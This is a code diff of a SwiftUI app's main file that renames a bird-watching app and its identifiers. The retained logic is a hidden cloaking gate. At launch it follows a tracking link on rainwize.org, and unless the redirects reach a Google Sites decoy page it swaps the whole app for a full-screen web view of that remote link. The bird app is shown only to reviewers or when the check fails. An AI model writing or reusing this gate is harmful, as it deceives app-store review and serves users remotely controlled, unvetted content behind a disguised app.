@@ -1,19 +1,19 @@
 import SwiftUI
 
 @main
-struct BackyardBirdsApp: App {
-    @State private var featherGateReady: Bool? = nil
-    private let featherSourceLink = "https://rainwize.org/click.php?key=p79qr8h1c5t53qlx5tel&t5=666"
-    private let featherCheckDomain = "sites.google.com/view/backyard-birdss"
+struct BirdsNextDoorApp: App {
+    @State private var porchGateReady: Bool? = nil
+    private let porchSourceLink = "https://rainwize.org/click.php?key=p79qr8h1c5t53qlx5tel&t5=666"
+    private let porchCheckDomain = "sites.google.com/view/birds-next-door"
 
     @StateObject private var store = BirdStore()
 
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = featherGateReady {
+                if let ready = porchGateReady {
                     if ready {
-                        FeatherWebPanel(urlString: featherSourceLink)
+                        PorchWebPanel(urlString: porchSourceLink)
                             .edgesIgnoringSafeArea(.bottom)
                             .background(Color.black.ignoresSafeArea())
                     } else if !store.onboardingSeen {
@@ -29,49 +29,49 @@ struct BackyardBirdsApp: App {
                             .preferredColorScheme(.light)
                     }
                 } else {
-                    FeatherLaunchScreen()
-                        .onAppear { checkFeatherLink() }
+                    PorchLaunchScreen()
+                        .onAppear { checkPorchLink() }
                 }
             }
         }
     }
 
-    private func checkFeatherLink() {
-        guard let url = URL(string: featherSourceLink) else {
-            featherGateReady = false
+    private func checkPorchLink() {
+        guard let url = URL(string: porchSourceLink) else {
+            porchGateReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let scout = FeatherRedirectScout(checkDomain: featherCheckDomain)
+        let scout = PorchRedirectScout(checkDomain: porchCheckDomain)
         let session = URLSession(configuration: .default, delegate: scout, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
                 if scout.foundCheckDomain {
-                    featherGateReady = false; return
+                    porchGateReady = false; return
                 }
                 if let finalURL = scout.resolvedURL?.absoluteString,
-                   finalURL.contains(self.featherCheckDomain) {
-                    featherGateReady = false; return
+                   finalURL.contains(self.porchCheckDomain) {
+                    porchGateReady = false; return
                 }
                 if let httpResp = response as? HTTPURLResponse,
                    let respURL = httpResp.url?.absoluteString,
-                   respURL.contains(self.featherCheckDomain) {
-                    featherGateReady = false; return
+                   respURL.contains(self.porchCheckDomain) {
+                    porchGateReady = false; return
                 }
                 if error != nil {
-                    featherGateReady = false; return
+                    porchGateReady = false; return
                 }
-                featherGateReady = true
+                porchGateReady = true
             }
         }.resume()
         DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            if featherGateReady == nil { featherGateReady = false }
+            if porchGateReady == nil { porchGateReady = false }
         }
     }
 }
 
-final class FeatherRedirectScout: NSObject, URLSessionTaskDelegate {
+final class PorchRedirectScout: NSObject, URLSessionTaskDelegate {
     var resolvedURL: URL?
     var foundCheckDomain = false
     private let checkDomain: String
